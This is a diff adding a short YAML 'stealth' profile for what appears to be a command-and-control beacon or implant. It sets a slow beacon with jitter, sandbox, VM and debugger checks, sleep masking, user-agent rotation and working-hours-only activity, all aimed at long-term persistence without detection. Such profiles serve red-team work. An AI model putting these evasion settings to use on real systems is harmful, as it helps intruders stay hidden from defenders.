@@ -1,0 +1,14 @@
+# Stealth profile - maximum OPSEC, slow beacon (for long-term persistence)
+name: stealth
+sleep_interval: 300s
+jitter_percent: 50
+max_retries: 3
+enable_sandbox_check: true
+enable_vm_check: true
+enable_debug_check: true
+sleep_masking: true
+user_agent_rotation: true
+kill_date: ""
+working_hours_only: true
+working_hours_start: 8
+working_hours_end: 18
